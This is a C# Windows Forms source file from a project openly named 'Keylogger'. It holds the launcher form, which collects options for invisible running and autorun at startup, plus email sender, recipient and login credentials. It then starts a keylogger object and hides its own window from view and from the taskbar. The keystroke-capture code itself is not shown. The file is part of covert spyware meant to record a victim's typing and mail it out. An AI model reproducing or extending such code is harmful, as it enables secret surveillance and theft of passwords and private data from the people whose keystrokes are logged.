using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Keylogger
{
    public partial class main : Form
    {
        public main()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {



        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            this.linkLabel1.LinkVisited = true;

            // reindirizza ad un URL.
            System.Diagnostics.Process.Start("https://github.com/CaffeLatteIV/Keylogger");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            bool invisible = checkBoxInvisible.Checked;
            bool autorun = checkBoxAutoRun.Checked;
            string from = textBoxFrom.Text;
            string to = textBoxTo.Text;
            string user = textBoxUsername.Text;
            string password = textBoxPassword.Text;
            Application.Run(new keylogger(from, to, user, password, invisible, autorun));
            this.Opacity = 0;
            this.ShowInTaskbar = false;

        }
    }
}
